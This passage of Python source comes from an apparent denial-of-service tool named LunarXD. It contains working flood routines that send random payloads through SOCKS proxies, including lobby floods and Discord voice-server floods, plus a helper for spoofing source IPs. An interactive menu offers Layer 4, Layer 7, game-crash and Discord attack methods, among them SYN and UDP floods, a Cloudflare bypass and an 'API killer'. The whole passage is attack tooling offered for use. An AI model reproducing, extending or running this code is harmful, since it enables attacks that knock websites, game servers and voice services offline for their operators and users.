            proxy_ip, proxy_port = proxy.split(":")
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            s.settimeout(0.5)
            for _ in range(1000):
                payload = Choice(payloads)
                s.sendto(payload, (target_ip, target_port))
            s.close()
        except:
            if s:
                s.close()

def lobby_flood(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        b"\x01\x00" + os.urandom(16),
        b"\x02\x00" + os.urandom(32),
    ]
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target_ip, target_port))
            for _ in range(1000):
                payload = Choice(payloads)
                s.send(payload)
            s.close()
        except:
            if s:
                s.close()

def discord(event, proxy_type, target_ip, target_port):
    global proxies
    payloads = [
        b"\x00\x00" + os.urandom(128),
        b"\xFF\xFF" + os.urandom(64),
    ]
    event.wait()
    while event.is_set():
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((target_ip, target_port))
            for _ in range(1000):
                payload = Choice(payloads)
                s.send(payload)
            s.close()
        except:
            if s:
                s.close()

def spoof_source_ip():
    return f"{Intn(1, 255)}.{Intn(0, 255)}.{Intn(0, 255)}.{Intn(0, 255)}"

def parse_discord_link(link):
    try:
        if "discord" not in link:
            return None, None
        return "voice.discord.com", 443
    except:
        return None, None

def Launch(method, url, threads, duration, proxy_type, port=None):
    global target, path, protocol, proxies
    event = threading.Event()
    clearcs()

    if not load_proxies():
        return False

    print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "             ╦  ╦ ╦╔╗╔╔═╗╦═╗")}
{Colorate.Horizontal(Colors.cyan_to_blue, "             ║  ║ ║║║║╠═╣╠╦╝")}
{Colorate.Horizontal(Colors.cyan_to_blue, "             ╩═╝╚═╝╝╚╝╩ ╩╩╚═𝔁𝓭")}
{white}  ⏾⋆.˚ 𝓐𝓽𝓽𝓪𝓬𝓴 𝔀𝓪𝓼 𝓼𝓮𝓷𝓽 𝓼𝓾𝓬𝓬𝓮𝓼𝓼𝓯𝓾𝓵𝓵𝔂! ⏾⋆.˚
{Colorate.Horizontal(Colors.cyan_to_blue, "┌───────────────────────────────────────────┐")}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴀᴛᴛᴀᴄᴋ ꜱᴜᴍᴍᴀʀʏ
{Colorate.Horizontal(Colors.cyan_to_blue, "├────────────────────────────────────────────")}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛᴀʀɢᴇᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "🎯  ➤")}  {(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http_storm', 'api_killer'] else url).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴍᴏᴅᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "⚙️     ➤")}  {method.ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛɪᴍᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "⌛    ➤")}  {str(duration).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛʜʀᴇᴀᴅ {Colorate.Horizontal(Colors.cyan_to_blue, "⚔   ➤")}  {str(threads).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴘʀᴏxʏ ᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "⦻  ➤")}  {str(proxy_type).ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴘʀᴏxʏ ꜰ {Colorate.Horizontal(Colors.cyan_to_blue, "☣  ➤")}  {out_file.ljust(30)}
{Colorate.Horizontal(Colors.cyan_to_blue, "├────────────────────────────────────────────")}
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ɢɪᴛʜᴜʙ     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://github.com/Sakuzuna/
{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴄʜᴇᴄᴋʜᴏꜱᴛ  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://check-host.net/check-http?host={(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http_storm', 'api_killer'] else url)}
{Colorate.Horizontal(Colors.cyan_to_blue, "└───────────────────────────────────────────┘")}""")

    if method in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike", "game-crash", "lobby-flood"]:
        if not ParseUrl(url, is_layer4=True):
            return False
        target_ip = target
        target_port = port if port else 80
    elif method == "discord":
        target_ip, target_port = parse_discord_link(url)
        if not target_ip:
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid Discord link or unable to resolve voice server."))
            return False
        target_port = port if port else target_port
    else:
        if not ParseUrl(url):
            return False
        target_ip = target
        target_port = port if port else port

    build_threads(method, threads, event, proxy_type, target_ip, target_port)
    event.set()
    time.sleep(duration)
    event.clear()
    print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Attack {method.upper()} finished."))
    return True

def main():
    global proxies, thread_num, out_file
    proxies = []
    out_file = "proxies.txt"
    thread_num = 300

    clearcs()
    bannerm()

    while True:
        command = input(Colorate.Horizontal(Colors.cyan_to_blue, """┌─[ʟᴜɴᴀʀxᴅ]─[~]
└──╼ ➤ """)).strip().lower()
        
        if command:
            if command in ["methods", "help", "menu"]:
                try:
                    play_ascii_video("banner.mp4", duration=2.5)
                    clearcs()
                except:
                    clearcs()
                    runbanner()
            else:
                try:
                    clearcs()
                    play_ascii_video("banner.mp4", duration=2.5)
                except:
                    runbanner()

        if command == "help":
            clearcs()
            print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("COMMANDS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}exit              {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Exit the tool
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}HELP              {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Show this help message
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}methods           {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   List available attack methods
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}menu              {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Return to the main menu

{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("L4 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .l4 <method> <ip>[:port] <threads> <duration> [port]        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run LAYER4 attack 

{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("L7 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
   
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .l7 <method> <url> <threads> <duration> [port]              {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run LAYER7 attack         

{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("GAME METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .game <method> <ip>[:port] <threads> <duration> [port]      {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run GAME attack 
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .discord <link> <threads> <duration> [port]                 {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run DISCORD tcp flood
""")

        elif command == "methods":
            clearcs()
            print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("L4 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}udpflood    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   High-intensity UDP flood with spoofed IPs.                           {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}tcpflood    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Aggressive TCP SYN flood with spoofed IPs.                           {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}dns         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   DNS flood with randomized queries.                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}udp-kill    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Extreme UDP flood with large payloads.                              {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}icmp-blast  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   ICMP flood with spoofed sources.                                    {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}syn-strike  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   SYN flood with randomized source IPs.                               {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("L7 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}cc          {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP GET flood with randomized URLs.                                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}post        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP POST flood with large payloads.                                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}head        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP HEAD flood to overload servers.                                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}uambypass   {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP flood with randomized user-agents and IPs.                     {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}browser     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Browser-like HTTP requests with session persistence.                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}home        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets home pages with spoofed IPs.                                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}cfbypass    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Bypasses Cloudflare with dynamic headers and cookies.               {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}tls         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   TLS handshake flood with modern ciphers.                            {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}ovh         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets OVH-hosted servers with customized requests.                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}dgb         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods with anti-DDoS bypass headers.                               {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}http-storm  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Multi-method HTTP flood (GET/HEAD/OPTIONS).                         {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}api-killer  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets API endpoints with JSON payloads.                           {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("GAME METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}game-crash  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Sends malformed packets to crash game servers.                       {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}lobby-flood {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods game server lobbies with connection requests.                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("SPECIAL METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}

{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}discord     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods Discord voice servers with TCP packets.                      {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
""")

        elif command == "menu":
            clearcs()
            bannerm2()

        elif command == "exit":
            clearcs()
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Exiting LunarXD."))
            sys.exit()

        elif command.startswith(".l7"):
            try:
                args = command.split()
                if len(args) < 5:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .l7 <method> <url> <threads> <duration> [port]"))
                    continue
                method = args[1].lower()

                if method == "http-storm":
                    method = "http_storm"
                url = args[2]
                threads = int(args[3])
                duration = int(args[4])
                port = int(args[5]) if len(args) > 5 else None
                proxy_type = 5
                if method not in ["cc", "post", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http_storm", "api_killer"]:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L7 method. Use 'methods' to list available options."))
                    continue
                if threads < 1 or duration < 1:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
                    continue
                Launch(method, url, threads, duration, proxy_type, port)
            except (ValueError, IndexError):
                clearcs()
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .l7 <method> <url> <threads> <duration> [port]"))

        elif command.startswith(".l4"):
            try:
                args = command.split()
                if len(args) < 5:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .l4 <method> <ip> <threads> <duration> [port]"))
                    continue
                method = args[1].lower()
                ip = args[2]
                threads = int(args[3])
                duration = int(args[4])
                port = int(args[5]) if len(args) > 5 else None
                proxy_type = 5
                if method not in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike"]:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L4 method. Use 'methods' to list available options."))
                    continue
                if threads < 1 or duration < 1:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
                    continue
                Launch(method, ip, threads, duration, proxy_type, port)
            except (ValueError, IndexError):
                clearcs()
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .l4 <method> <ip> <threads> <duration> [port]"))

        elif command.startswith(".game"):
            try:
                args = command.split()
                if len(args) < 5:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .game <method> <ip> <threads> <duration> [port]"))
                    continue
                method = args[1].lower()
                ip = args[2]
                threads = int(args[3])
                duration = int(args[4])
                port = int(args[5]) if len(args) > 5 else None
                proxy_type = 5
                if method not in ["game-crash", "lobby-flood"]:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid game method. Use 'methods' to list available options."))
                    continue
                if threads < 1 or duration < 1:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
                    continue
                Launch(method, ip, threads, duration, proxy_type, port)
            except (ValueError, IndexError):
                clearcs()
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .game <method> <ip> <threads> <duration> [port]"))

        elif command.startswith(".discord"):
            try:
                args = command.split()
                if len(args) < 4:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .discord <link> <threads> <duration> [port]"))
                    continue
                method = "discord"
                link = args[1]
                threads = int(args[2])
                duration = int(args[3])
                port = int(args[4]) if len(args) > 4 else None
                proxy_type = 5
                if threads < 1 or duration < 1:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
                    continue
                Launch(method, link, threads, duration, proxy_type, port)
            except (ValueError, IndexError):
                clearcs()
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .discord <link> <threads> <duration> [port]"))

        else:
            clearcs()
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Unknown command. Type 'help' for a list of commands."))

if __name__ == "__main__":
    main()
